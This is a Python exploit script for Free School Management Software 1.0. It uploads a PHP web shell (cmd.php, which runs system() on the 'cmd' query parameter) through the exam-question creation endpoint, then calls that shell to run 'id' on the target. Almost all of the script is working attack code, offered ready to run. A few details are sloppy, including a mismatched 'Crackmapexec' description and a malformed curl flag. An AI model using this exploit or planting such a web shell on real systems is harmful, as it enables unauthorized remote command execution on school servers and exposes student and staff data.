#!/usr/bin/env python3 

#Used for Free School Management Software 1.0 (RCE)

import os, sys, time, subprocess
try:
    import argparse
except ImportError:
    os.system("python3 -m pip install argparse")
    os.system("python -m pip install argparse")

from subprocess import Popen, PIPE
try:
    from colorama import Fore
except ImportError:
    os.system("python3 -m pip install colorama")
    os.system("python -m pip install colorama")

RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
RESET = Fore.RESET

parser = argparse.ArgumentParser(description="Crackmapexec", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("-r", "--RHOST", action="store", help="RHOST ex: 10.10.10.1 ")
parser.add_argument("-u", "--URL", action="store", help="URL ex: /management, if just /admin leave blank")
args = parser.parse_args()
parser.parse_args(args=None if sys.argv[1:] else ['--help'])

RHOST = args.RHOST
URL = args.URL

def ATTACK():
    print(f"{YELLOW}Uploading cmd.php to http://{RHOST}/{URL}/admin/examQuestion/create{RESET}")
    s = Popen([f"curl -i -s -k -X $'POST' \
    -H $'Host: {RHOST}' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: multipart/form-data; boundary=---------------------------183813756938980137172117669544' -H $'Content-Length: 1331' -H $'Connection: close' -H $'Cache-Control: max-age=0' -H $'Upgrade-Insecure-Requests: 1' \
    --data-binary $'-----------------------------183813756938980137172117669544\x0d\x0aContent-Disposition: form-data; name=\"name\"\x0d\x0a\x0d\x0atest4\x0d\x0a-----------------------------183813756938980137172117669544\x0d\x0aContent-Disposition: form-data; name=\"class_id\"\x0d\x0a\x0d\x0a2\x0d\x0a-----------------------------183813756938980137172117669544\x0d\x0aContent-Disposition: form-data; name=\"subject_id\"\x0d\x0a\x0d\x0a5\x0d\x0a-----------------------------183813756938980137172117669544\x0d\x0aContent-Disposition: form-data; name=\"timestamp\"\x0d\x0a\x0d\x0a2021-12-08\x0d\x0a-----------------------------183813756938980137172117669544\x0d\x0aContent-Disposition: form-data; name=\"teacher_id\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------183813756938980137172117669544\x0d\x0aContent-Disposition: form-data; name=\"file_type\"\x0d\x0a\x0d\x0atxt\x0d\x0a-----------------------------183813756938980137172117669544\x0d\x0aContent-Disposition: form-data; name=\"status\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------183813756938980137172117669544\x0d\x0aContent-Disposition: form-data; name=\"description\"\x0d\x0a\x0d\x0a123123\x0d\x0a-----------------------------183813756938980137172117669544\x0d\x0aContent-Disposition: form-data; name=\"_wysihtml5_mode\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------183813756938980137172117669544\x0d\x0aContent-Disposition: form-data; name=\"file_name\"; filename=\"cmd.php\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a<?php system($_GET[\"cmd\"]); ?>\x0d\x0a-----------------------------183813756938980137172117669544--' \
    $'http://{RHOST}/{URL}/examQuestion/create'"], shell=True)
    s.wait()

def RCE():
    print(f"{YELLOW}Trying for RCE calling for http://{RHOST}/{URL}/uploads/exam_question/cmd.php?cmd=id{RESET}")
    s = Popen([f"curl -i -s -k -X -L $'GET' \
    -H $'Host: {RHOST}' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'ci_session=6kd2op4nljm6d83pnvp194hvdb7nkgqg' \
    $'http://{RHOST}/{URL}/uploads/exam_question/cmd.php?cmd=id'"], shell=True, stderr=PIPE, stdout=PIPE)
    s.wait()

def main():
    ATTACK()
    RCE()

if __name__ == '__main__':
    main()
